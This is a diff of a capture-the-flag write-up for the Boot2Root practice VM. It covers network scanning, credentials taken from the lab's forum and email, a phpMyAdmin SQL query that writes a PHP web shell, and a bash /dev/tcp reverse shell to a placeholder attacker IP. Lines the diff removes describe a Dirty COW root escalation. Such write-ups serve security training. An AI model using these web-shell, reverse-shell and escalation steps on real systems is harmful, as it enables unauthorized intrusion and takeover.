@@ -1,4 +1,6 @@
-# Boot2Root - Writeup1 Summary
+
+
+ #  Reverse shell - Summary
 
 ## Network Discovery and Service Enumeration
 
@@ -7,133 +9,107 @@ The target VM operates in bridged network mode. Begin by identifying your local 
 ```bash
 ifconfig
 ```
-Example output shows the local IP as 192.168.1.47. Perform a network scan to locate the VM:
+
+To know the IP of the target host:
 
 ```bash
-nmap 192.168.1.0/24
+sudo netdiscover -r 192.168.56.0/24
 ```
 
+## Identified target IP: 192.168.1.4
 
-## Identified target IP: 192.168.1.22
 Open services:
 
-```bash
-FTP (21)
-
-SSH (22)
-
-HTTP (80)
-
-HTTPS (443)
-
-IMAP (143)
-
-IMAPS (993)
-```
+- FTP (21)
+- SSH (22)
+- HTTP (80)
+- HTTPS (443)
+- IMAP (143)
+- IMAPS (993)
 
 ## Web Server Analysis
-Initial Reconnaissance
+
+### Initial Reconnaissance
+
 Access the web server on port 80:
 
 ```bash
-curl 192.168.1.22
+curl 192.168.1.4
 ```
 
-The response contains a basic HTML page .
+The response contains a basic HTML page.
 
 ## Directory Enumeration
 
 Use dirb to discover hidden paths over HTTPS:
 
 ```bash
-dirb https://192.168.1.22 -r
+dirb https://192.168.1.4 -r
 ```
 
 Discovered endpoints:
 
-Forum: https://192.168.1.22/forum/
-
-phpMyAdmin: https://192.168.1.22/phpmyadmin/
-
-Webmail: https://192.168.1.22/webmail/
-
+- Forum: https://192.168.1.4/forum/
+- phpMyAdmin: https://192.168.1.4/phpmyadmin/
+- Webmail: https://192.168.1.4/webmail/
 
 ## Service Exploration
-## 1-Forum Analysis
-Review forum posts. A post by user lmezard contains SSH logs with an apparent password attempt:
 
-Password: !q\]Ej?*5K5cy*AJ
+### 1-Forum Analysis
 
-Use these credentials to log into the forum (user: lmezard).
+Review forum posts. A post by user `lmezard` contains SSH logs with an apparent password attempt:
 
-Discover the associated email: laurie@borntosec.net
+Password: `!q\]Ej?*5K5cy*AJ`
 
+Use these credentials to log into the forum (`user: lmezard`).
 
-## 2-Webmail Access
-Log into webmail (Roundcube) using laurie@borntosec.net and the found password.
+Discover the associated email: `laurie@borntosec.net`
+
+### 2-Webmail Access
+
+Log into webmail (Roundcube) using `laurie@borntosec.net` and the found password.
 
 Retrieve database credentials from an email:
-Username: root
-Password: Fg-'kKXBj87E:aJ$
 
-## 3-phpMyAdmin Exploitation
+  - Username: `root`  
+  - Password: `Fg-'kKXBj87E:aJ$`
+
+### 3-phpMyAdmin Exploitation
+
 Access phpMyAdmin with the obtained credentials.
 
 Execute SQL injection to create a web shell:
 
-```bash
-SELECT 1, '<?php system($_GET["cmd"]." 2>&1"); ?>' 
-INTO OUTFILE '/var/www/forum/templates_c/backdoor.php'
+```sql
+SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/forum/templates_c/shell.php"; 
 ```
 
-Server Compromise
-Reverse Shell Setup
+## Server Compromise
+
+### Reverse Shell Setup
+
 Host a netcat listener locally:
 
 ```bash
-ncat -nvklp 1234
+nc -nvlp 4444
 ```
 
 Trigger reverse shell via the web backdoor (URL-encoded Python reverse shell command):
-```bash
-curl --insecure 'https://192.168.1.22/forum/templates_c/backdoor.php?cmd=[ENCODED_COMMAND]'
-```
-
-Gain limited access as www-data.
-
-## Privilege Escalation (Dirty Cow Exploit)
- 1-Check kernel version (vulnerable to CVE-2016-5195):
-```bash
-uname -a  # Output: Linux BornToSecHackMe 3.2.0-91-generic-pae
-```
-    Upload/Write Exploit Code:
-    Save as dirty.c (code reference => https://github.com/FireFart/dirtycow).
-
- 2-Compile and execute Dirty Cow exploit:
-```bash
- gcc dirty.c -o dirty -pthread -lcrypt
-./dirty
-
-```
-
- 3-Set new root password via exploit and escalate privileges:
 
 ```bash
- su root
-Password: [Exploit-defined password, e.g., 'q']
-```
-
-## Final Steps
-Confirm root access:
-
-```bash
-id  # Output: uid=0(root) gid=0(root) groups=0(root)
-```
-
-Locate final flag:
-```bash
-cat /root/README  # Contains "CONGRATULATIONS!!!!"
+https://192.168.1.4/forum/templates_c/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/YOUR-IP/4444+0>%261'
 ```
 
 
+### Getting a fully interactive shell
 
+To fix the PTY:
+
+```bash
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+then press `ctrl+z`, and run:
+
+```bash
+stty raw -echo; fg;
+```
